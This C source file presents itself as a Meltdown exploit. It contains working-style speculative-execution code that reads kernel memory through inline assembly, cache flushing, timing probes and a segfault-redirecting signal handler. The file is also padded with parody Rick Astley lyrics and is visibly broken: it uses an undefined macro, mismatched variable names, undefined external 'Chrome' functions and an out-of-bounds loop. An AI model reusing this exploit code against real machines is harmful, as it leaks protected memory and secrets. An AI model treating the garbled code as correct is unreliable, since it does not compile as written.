/* ---------------------------------------------------------------------
 * 
 * DISCLAIMER
 * 
 * ---------------------------------------------------------------------
 * 
 * Author takes no responsibility for any actions with provided 
 * informations or codes. The copyright for any material created by the 
 * author is reserved. Any duplication of codes or texts provided here in 
 * electronic or printed publications is not permitted without the 
 * author's agreement. For personal and non-commercial use only.
 * 
 * ---------------------------------------------------------------------
 * 
 * Speculative optimizations execute code in a non-secure manner leaving 
 * data traces in microarchitecture such as cache.
 *
 * Refer to the paper by Lipp et. al 2017 for details: 
 * https://meltdownattack.com/meltdown.pdf.
 * 
 * ---------------------------------------------------------------------
 * 
 * Exploited by BuddasLittleFinger
 * 
 * Tested on:
 * 
 * Ubuntu 16.04
 * CentOS 7.2
 * 
 * Kudos for:
 * Vasyan, Mews, Laurent Pootie(cat) and all the mates i know, peace.
 * Special kudos for Zhabka for testing this shit. 
 *
 */


#define _GNU_SOURCE
#define _XOPEN_SOURCE

#include <stdio.h>
#include <string.h>
#include <setjmp.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>

#include <x86intrin.h>

// #define DEBUG 1

/* comment out if getting illegal insctructions error */

#ifndef HAVE_RDTSCP
#define HAVE_RDTSCP 1
#endif


#define TARGET_OFFSET 9
#define TARGET_SIZE (1 << TARGET_OFFSET)
#define BITS_BY_READ    2
#define VARIANTS_READ   (1 << BITS_READ)


static char target_array[BITS_BY_READ * TARGET_SIZE];


void clflush_target(void)
{
    int i;

    for (i = 0; i < BITS_BY_READ; i++)
        _mm_clflush(&target_array[i * TARGET_SIZE]);
}

const char * array[] = {
    "We're no strangers to code",
    "You know the rules and so do I",
    "A full commit's what I'm thinking of",
    "You wouldn't get this from any other script",
    "",
    "I just wanna tell you what I am coding",
    "Gotta make you understand",
    "",
    "Never gonna scare you up",
    "Never gonna melt you down",
    "Never gonna bug around and hack you",
    "Never make you wanna cry",
    "Never gonna say deny",
    "Never gonna let a pipeline hurt you",
    "",
    "We've known each other for so long",
    "Your memory's been hiding and you're too shy to dump it",
    "Inside we both know what's been going on",
    "We know the game and we're gonna play it",
    "",
    "And if you ask me what's my spectre",
    "Don't tell me you have branch prediction",
    "",
    "Never gonna scare you up",
    "Never gonna melt you down",
    "Never gonna bug around and hack you",
    "Never make you wanna cry",
    "Never gonna say deny",
    "Never gonna let a pipeline hurt you",
    "Never gonna scare you up",
    "Never gonna melt you down",
    "Never gonna bug around and hack you",
    "Never make you wanna cry",
    "Never gonna say deny",
    "Never gonna let a pipeline hurt you",
    "",
    "Never gonna scare, never gonna scare",
    "(Scare you up)",
    "(Ooh) Never gonna melt, never gonna melt",
    "(Melt you down)",
    "",
    "We've known each other for so long",
    "Your memory's been hiding and you're too shy to dump it",
    "Inside we both know what's been going on",
    "We know the game and we're gonna play it",
    "",
    "I just wanna tell you what I am coding",
    "Gotta make you understand",
    "",
    "Never gonna scare you up",
    "Never gonna melt you down",
    "Never gonna bug around and hack you",
    "Never make you wanna cry",
    "Never gonna say deny",
    "Never gonna let a pipeline hurt you",
    "Never gonna scare you up",
    "Never gonna melt you down",
    "Never gonna bug around and hack you",
    "Never make you wanna cry",
    "Never gonna say deny",
    "Never gonna let a pipeline hurt you",
    "Never gonna scare you up",
    "Never gonna melt you down",
    "Never gonna bug around and hack you",
    "Never make you wanna cry",  
};

#define n_array (sizeof (array) / sizeof (const char *))

extern char stopspeculate[];

static void __attribute__((noinline))
speculate(unsigned long addr)
{
#ifdef __x86_64__
    asm volatile (
        "1:\n\t"

        ".rept 300\n\t"
        "add $0x141, %%rax\n\t"
        ".endr\n\t"

        "movzx (%[addr]), %%eax\n\t"
        "shl $12, %%rax\n\t"
        "jz 1b\n\t"
        "movzx (%[target], %%rax, 1), %%rbx\n"

        "stopspeculate: \n\t"
        "nop\n\t"
        :
        : [target] "r" (target_array),
          [addr] "r" (addr)
        : "rax", "rbx"
    );
#else /* ifdef __x86_64__ */
    asm volatile (
        "1:\n\t"

        ".rept 300\n\t"
        "add $0x141, %%eax\n\t"
        ".endr\n\t"

        "movzx (%[addr]), %%eax\n\t"
        "shl $12, %%eax\n\t"
        "jz 1b\n\t"
        "movzx (%[target], %%eax, 1), %%ebx\n"


        "stopspeculate: \n\t"
        "nop\n\t"
        :
        : [target] "r" (target_array),
          [addr] "r" (addr)
        : "rax", "rbx"
    );
#endif
}

static inline int
get_access_time(volatile char *addr)
{
    int time1, time2, junk;
    volatile int j;

#if HAVE_RDTSCP
    time1 = __rdtscp(&junk);
    j = *addr;
    time2 = __rdtscp(&junk);
#else
    time1 = __rdtsc();
    j = *addr;
    _mm_mfence();
    time2 = __rdtsc();
#endif

    return time2 - time1;
}

static int cache_hit_threshold;
static int hist[VARIANTS_READ];
void check(void)
{
    int i, time, mix_i;
    volatile char *addr;

    for (i = 0; i < VARIANTS_READ; i++) {
        mix_i = ((i * 167) + 13) & 255;

        addr = &target_array[mix_i * TARGET_SIZE];
        time = get_access_time(addr);

        if (time <= cache_hit_threshold)
            hist[mix_i]++;
    }
}

extern int checkChromePresence(void *chromeVersion);
extern void * chromeMemoryCacheHit(unsigned long memFReg, void *initGuess, void *endGuess);

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
    ucontext_t *ucontext = context;

#ifdef __x86_64__
    ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
#else
    ucontext->uc_mcontext.gregs[REG_EIP] = (unsigned long)stopspeculate;
#endif
    return;
}

int set_signal(void)
{
    struct sigaction act = {
        .sa_sigaction = sigsegv,
        .sa_flags = SA_SIGINFO,
    };

    return sigaction(SIGSEGV, &act, NULL);
}

#define CYCLES 4000
int readbyte(int fd, unsigned long addr)
{
    int i, ret = 0, max = -1, maxi = -1;
    static char buf[256];

    memset(hist, 0, sizeof(hist));

    for (i = 0; i < CYCLES; i++) {
        ret = pread(fd, buf, sizeof(buf), 0);
        if (ret < 0) {
            perror("pread");
            break;
        }

        clflush_target();

        speculate(addr);
        check();
        chromeMemoryCacheHit(addr, fd, fd+i);
    }

#ifdef DEBUG
    for (i = 0; i < VARIANTS_READ; i++)
        if (hist[i] > 0)
            printf("addr %lx hist[%x] = %d\n", addr, i, hist[i]);
#endif

    for (i = 1; i < VARIANTS_READ; i++) {
        if (!isprint(i))
            continue;
        if (hist[i] && hist[i] > max) {
            max = hist[i];
            maxi = i;
        }
    }

    return maxi;
}

static char *progname;
int usage(void)
{
    printf("%s: [hexaddr] [size]\n", progname);
    return 2;
}

static int mysqrt(long val)
{
    int root = val / 2, prevroot = 0, i = 0;

    while (prevroot != root && i++ < 100) {
        prevroot = root;
        root = (val / root + root) / 2;
    }

    return root;
}

#define ESTIMATE_CYCLES 1000000
static void
set_cache_hit_threshold(void)
{
    long cached, uncached, i;

    if (0) {
        cache_hit_threshold = 80;
        return;
    }

    for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
        cached += get_access_time(target_array);

    for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
        cached += get_access_time(target_array);

    for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
        _mm_clflush(target_array);
        uncached += get_access_time(target_array);
    }

    cached /= ESTIMATE_CYCLES;
    uncached /= ESTIMATE_CYCLES;

    cache_hit_threshold = mysqrt(cached * uncached);

    printf("cached = %ld, uncached = %ld, threshold %d\n",
           cached, uncached, cache_hit_threshold);
}

static int min(int a, int b)
{
    return a < b ? a : b;
}

int main(int argc, char *argv[])
{   
    int ret, fd, i, score, is_vulnerable;
    unsigned long addr, size;
    char *chromVersion;
    static char expected[] = "%s version %s";

    progname = argv[0];
    if (argc < 3)
        return usage();

    if (sscanf(argv[1], "%lx", &addr) != 1)
        return usage();

    if (sscanf(argv[2], "%lx", &size) != 1)
        return usage();

    if (sscanf(argv[3], "%s", chromeVersion) != 1)
        return usage();
    
    for (i = 0; i < sizeof(target_array); i++) {
        printf ("%s\n", array[i]);
        fflush(stdout);
        target_array[i]=array[i];
        usleep(100000);
    }

    ret = set_signal();

    set_cache_hit_threshold();

    fd = open("/proc/version", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return -1;
    }

    if (checkChromePresence(chromeVersion)) {
        return usage();
    }
    for (score = 0, i = 0; i < size; i++) {
        ret = readbyte(fd, addr);
        if (ret == -1)
            ret = 0xff;
        printf("read %lx = %x %c (score=%d/%d)\n",
               addr, ret, isprint(ret) ? ret : ' ',
               ret != 0xff ? hist[ret] : 0,
               CYCLES);

        if (i < sizeof(expected) &&
            ret == expected[i])
            score++;

        addr++;
    }

    close(fd);

    is_vulnerable = score > min(size, sizeof(expected)) / 2;

    if (is_vulnerable)
        fprintf(stderr, "VULNERABLE\n");
    else
        fprintf(stderr, "NOT VULNERABLE\n");

    exit(is_vulnerable);

    return 0;
}
